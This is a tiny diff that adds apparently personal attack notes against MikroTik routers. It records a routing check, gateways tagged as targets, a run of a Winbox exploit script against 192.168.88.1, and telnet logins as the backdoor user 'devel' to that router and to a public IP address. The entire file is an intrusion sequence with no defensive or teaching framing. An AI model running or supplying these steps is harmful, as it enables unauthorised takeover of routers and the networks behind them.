@@ -1,0 +1,9 @@
+route -n
+10.4.186.1 gateway mikrotik target
+ 192.168.88.1 gateway hotspt
+/WinboxExploit.py 192.168.88.1
+
+
+telnet -l devel 192.168.88.1
+
+telnet -l devel 79.175.163.200:21
